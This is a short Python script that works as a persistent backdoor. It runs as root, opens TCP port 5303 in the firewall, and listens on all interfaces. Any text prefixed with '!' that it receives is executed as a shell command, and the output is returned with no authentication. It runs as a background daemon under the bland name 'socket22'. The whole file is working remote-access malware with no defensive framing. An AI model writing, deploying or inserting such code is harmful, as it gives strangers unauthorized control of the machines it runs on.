import socket
import os
from PIL import Image
import subprocess
from daemonize import Daemonize
os.setuid(0)
subprocess.run(['/bin/bash', '-c', 'cd /dev'])

subprocess.call(['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', '5303', '-j', 'ACCEPT'])

def handle_connection(conn):
    while True:
        data = conn.recv(1024)
        if not data:
            break
        cmd = data.decode().strip()
        if cmd.startswith('!'):
            output = os.popen(cmd[1:]).read()
            conn.sendall(output.encode())
        elif cmd == 'imagem':
            im = Image.open('imagem.jpg')
            im.show()

def run():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', 5303))
        s.listen(1)
        while True:
            conn, addr = s.accept()
            handle_connection(conn)

if __name__ == '__main__':
    pid = '/tmp/socket22.pid'
    daemon = Daemonize(app='socket22', pid=pid, action=run)
    daemon.start()
